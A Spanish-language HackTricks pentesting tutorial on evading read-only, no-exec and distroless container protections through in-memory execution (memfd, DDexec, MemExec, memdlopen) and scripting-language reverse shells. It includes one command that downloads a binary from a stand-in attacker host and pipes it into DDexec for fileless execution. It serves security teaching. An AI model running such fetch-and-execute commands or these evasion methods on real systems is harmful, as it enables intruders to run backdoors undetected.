# Bypassar protecciones del sistema de archivos: solo lectura / sin ejecución / Distroless

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Escenario de solo lectura / sin ejecución

Cada vez es más común encontrar máquinas Linux montadas con **protección de sistema de archivos de solo lectura (ro)**, especialmente en contenedores. Esto se debe a que ejecutar un contenedor con sistema de archivos ro es tan fácil como establecer **`readOnlyRootFilesystem: true`** en el `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Sin embargo, incluso si el sistema de archivos está montado como ro, **`/dev/shm`** seguirá siendo escribible, por lo que es falso que no podamos escribir nada en el disco. Sin embargo, esta carpeta estará **montada con protección sin ejecución**, por lo que si descargas un binario aquí, **no podrás ejecutarlo**.

{% hint style="warning" %}
Desde la perspectiva de un equipo de red, esto **complica la descarga y ejecución** de binarios que no están en el sistema (como puertas traseras o enumeradores como `kubectl`).
{% endhint %}

## Bypass más fácil: Scripts

Ten en cuenta que mencioné binarios, puedes **ejecutar cualquier script** siempre que el intérprete esté dentro de la máquina, como un **script de shell** si está presente `sh` o un **script de Python** si está instalado `python`.

Sin embargo, esto no es suficiente para ejecutar tu puerta trasera binaria u otras herramientas binarias que puedas necesitar ejecutar.

## Bypasses de memoria

Si quieres ejecutar un binario pero el sistema de archivos no lo permite, la mejor manera de hacerlo es **ejecutándolo desde la memoria**, ya que las protecciones no se aplican allí.

### Bypass de FD + exec syscall

Si tienes motores de script potentes dentro de la máquina, como **Python**, **Perl** o **Ruby**, puedes descargar el binario para ejecutarlo desde la memoria, almacenarlo en un descriptor de archivo de memoria (`create_memfd` syscall), que no estará protegido por esas protecciones, y luego llamar a una **syscall `exec`** indicando el **fd como el archivo a ejecutar**.

Para esto, puedes usar fácilmente el proyecto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puedes pasarle un binario y generará un script en el lenguaje indicado con el **binario comprimido y codificado en b64** con las instrucciones para **decodificar y descomprimirlo** en un **fd** creado llamando a la syscall `create_memfd` y una llamada a la syscall **exec** para ejecutarlo.

{% hint style="warning" %}
Esto no funciona en otros lenguajes de script como PHP o Node porque no tienen una **forma predeterminada de llamar syscalls en bruto** desde un script, por lo que no es posible llamar a `create_memfd` para crear el **fd de memoria** para almacenar el binario.

Además, crear un **fd regular** con un archivo en `/dev/shm` no funcionará, ya que no se te permitirá ejecutarlo debido a la protección **sin ejecución** que se aplicará.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) es una técnica que te permite **modificar la memoria de tu propio proceso** sobrescribiendo su **`/proc/self/mem`**.

Por lo tanto, al controlar el código ensamblador que se está ejecutando en el proceso, puedes escribir un **shellcode** y "mutar" el proceso para **ejecutar cualquier código arbitrario**.

{% hint style="success" %}
**DDexec / EverythingExec** te permitirá cargar y **ejecutar** tu propio **shellcode** o **cualquier binario** desde la **memoria**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para obtener más información sobre esta técnica, consulta el Github o:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) es el siguiente paso natural de DDexec. Es un **demonio de shellcode DDexec**, por lo que cada vez que desees **ejecutar un binario diferente**, no necesitas volver a lanzar DDexec, simplemente puedes ejecutar el shellcode de memexec a través de la técnica DDexec y luego **comunicarte con este demonio para pasar nuevos binarios para cargar y ejecutar**.

Puedes encontrar un ejemplo de cómo usar **memexec para ejecutar binarios desde un shell inverso de PHP** en [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con un propósito similar a DDexec, la técnica de [**memdlopen**](https://github.com/arget13/memdlopen) permite una **forma más fácil de cargar binarios** en memoria para luego ejecutarlos. Incluso podría permitir cargar binarios con dependencias.

## Bypass de Distroless

### ¿Qué es distroless?

Los contenedores distroless contienen solo los **componentes mínimos necesarios para ejecutar una aplicación o servicio específico**, como bibliotecas y dependencias de tiempo de ejecución, pero excluyen componentes más grandes como un gestor de paquetes, shell o utilidades del sistema.

El objetivo de los contenedores distroless es **reducir la superficie de ataque de los contenedores eliminando componentes innecesarios** y minimizando la cantidad de vulnerabilidades que se pueden explotar.

### Shell inverso

En un contenedor distroless, es posible que **ni siquiera encuentres `sh` o `bash`** para obtener una shell regular. Tampoco encontrarás binarios como `ls`, `whoami`, `id`... todo lo que normalmente ejecutas en un sistema.

{% hint style="warning" %}
Por lo tanto, **no podrás obtener una shell inversa** o **enumerar** el sistema como lo haces habitualmente.
{% endhint %}

Sin embargo, si el contenedor comprometido está ejecutando, por ejemplo, una aplicación web Flask, entonces Python está instalado y, por lo tanto, puedes obtener una **shell inversa de Python**. Si está ejecutando Node, puedes obtener una shell inversa de Node, y lo mismo con casi cualquier **lenguaje de script**.

{% hint style="success" %}
Usando el lenguaje de script, podrías **enumerar el sistema** utilizando las capacidades del lenguaje.
{% endhint %}

Si no hay protecciones de **solo lectura/sin ejecución**, podrías abusar de tu shell inversa para **escribir en el sistema de archivos tus binarios** y **ejecutarlos**.

{% hint style="success" %}
Sin embargo, en este tipo de contenedores, estas protecciones generalmente existirán, pero podrías usar las **técnicas de ejecución en memoria anteriores para evadirlas**.
{% endhint %}

Puedes encontrar **ejemplos** de cómo **explotar algunas vulnerabilidades de RCE** para obtener **shells inversas de lenguajes de script** y ejecutar binarios desde la memoria en [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
